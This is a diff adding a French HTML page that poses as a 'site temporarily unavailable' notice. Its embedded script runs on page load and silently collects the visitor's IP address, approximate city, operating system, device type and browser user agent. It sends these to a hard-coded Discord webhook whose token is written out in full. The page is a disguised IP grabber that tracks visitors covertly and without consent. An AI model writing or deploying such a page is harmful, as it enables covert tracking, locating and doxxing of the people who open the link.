@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Site Temporairement Indisponible</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 100px;
+        }
+        h1 {
+            font-size: 24px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Ce site est temporairement indisponible</h1>
+    
+    <script>
+        // Fonction pour envoyer les informations à un webhook Discord
+        function sendToDiscord(ipAddress, city, os, deviceType, browser) {
+            var webhookURL = "https://discord.com/api/webhooks/1146140442124107838/zqeL38QIOFyhl47TZB5A6rYzrfoxQm0fMZMSPgQRNuLhNSoM0mIPZ_11LJTjCNZy2aC1"; // Remplacez par l'URL de votre webhook Discord
+
+            var content = "> **Adresse IP : **" + ipAddress + " :earth_americas:" +
+                "\n> **Ville Approximative : **" + city + " :cityscape: " +
+                "\n> **Système d'exploitation : **" + os + " :gear: " +
+                "\n> **Type de dispositif : **" + deviceType + " :computer: :mobile_phone: " +
+                "\n> **Navigateur : **" + browser + " :globe_with_meridians:";
+
+            var request = new XMLHttpRequest();
+            request.open("POST", webhookURL);
+            request.setRequestHeader('Content-type', 'application/json');
+            var params = {
+                content: content
+            };
+            request.send(JSON.stringify(params));
+        }
+
+        // Fonction pour récupérer les informations de l'utilisateur
+        function getUserInfo() {
+            // Récupérer l'adresse IP de l'utilisateur en utilisant un service de géolocalisation
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    var ipAddress = data.ip;
+                    
+                    // Récupérer la ville en fonction de l'adresse IP
+                    fetch('https://ipapi.co/' + ipAddress + '/json/')
+                        .then(response => response.json())
+                        .then(data => {
+                            var city = data.city;
+                            var os = navigator.platform;
+                            var deviceType = /Mobile|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? "Téléphone" : "PC";
+                            var browser = navigator.userAgent;
+                            
+                            // Envoyer les informations à Discord
+                            sendToDiscord(ipAddress, city, os, deviceType, browser);
+                        })
+                        .catch(error => {
+                            console.error('Erreur lors de la récupération de la ville :', error);
+                        });
+                })
+                .catch(error => {
+                    console.error('Erreur lors de la récupération de l\'adresse IP :', error);
+                });
+        }
+
+        // Appeler la fonction pour récupérer les informations lorsque la page est chargée
+        window.onload = function() {
+            getUserInfo();
+        };
+    </script>
+</body>
+</html>
